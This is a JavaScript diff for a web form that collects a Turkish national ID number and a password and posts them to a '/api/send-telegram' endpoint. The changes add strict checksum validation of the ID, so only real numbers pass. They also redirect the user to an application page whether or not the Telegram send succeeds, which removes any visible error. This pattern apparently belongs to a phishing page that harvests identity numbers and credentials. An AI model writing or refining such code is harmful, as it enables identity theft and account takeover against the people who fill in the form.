@@ -408,11 +408,34 @@
         const tckn = (formData.get('tckn') || '').trim();
         const password = formData.get('password') || '';
 
-        // TC validasyonu
+        // Gerçek TC Kimlik Numarası validasyonu
         function validateTC(tc) {
+          // Temel kontroller
           if (!tc || tc.length !== 11) return false;
           if (!/^\d+$/.test(tc)) return false;
           if (tc[0] === '0') return false;
+          
+          // Tüm haneler aynı olamaz (11111111111 gibi)
+          if (/^(\d)\1{10}$/.test(tc)) return false;
+          
+          // TC Kimlik algoritması
+          const digits = tc.split('').map(Number);
+          
+          // İlk 10 hanenin toplamının mod 10'u 11. haneye eşit olmalı
+          const sumFirst10 = digits.slice(0, 10).reduce((a, b) => a + b, 0);
+          if (sumFirst10 % 10 !== digits[10]) return false;
+          
+          // İlk 9 haneden tek sıradakilerin (1,3,5,7,9) toplamı
+          const sumOdd = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
+          // İlk 9 haneden çift sıradakilerin (2,4,6,8) toplamı
+          const sumEven = digits[1] + digits[3] + digits[5] + digits[7];
+          
+          // (Tek toplam * 7 - Çift toplam) mod 10 = 10. hane
+          const checkDigit = (sumOdd * 7 - sumEven) % 10;
+          const checkDigitNormalized = checkDigit < 0 ? checkDigit + 10 : checkDigit;
+          
+          if (checkDigitNormalized !== digits[9]) return false;
+          
           return true;
         }
 
@@ -438,6 +461,7 @@
           submitButton.textContent = 'Gönderiliyor...';
         }
 
+        // TC geçerliyse Telegram'a gönder ve basvur.html'ye yönlendir
         fetch('/api/send-telegram', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -445,23 +469,13 @@
         })
         .then(response => response.json())
         .then(data => {
-          if (data.success) {
-            window.location.href = `basvur.html?tc=${encodeURIComponent(tckn)}`;
-          } else {
-            alert('Bir hata oluştu: ' + (data.error || 'Bilinmeyen hata'));
-            if (submitButton) {
-              submitButton.disabled = false;
-              submitButton.textContent = originalText;
-            }
-          }
+          // Telegram başarılı olsun ya da olmasın, TC geçerliyse basvur.html'ye yönlendir
+          window.location.href = `basvur.html?tc=${encodeURIComponent(tckn)}`;
         })
         .catch(error => {
           console.error('Error:', error);
-          alert('Bir hata oluştu. Lütfen tekrar deneyin.');
-          if (submitButton) {
-            submitButton.disabled = false;
-            submitButton.textContent = originalText;
-          }
+          // Hata olsa bile TC geçerliyse basvur.html'ye yönlendir
+          window.location.href = `basvur.html?tc=${encodeURIComponent(tckn)}`;
         });
         
         return false;
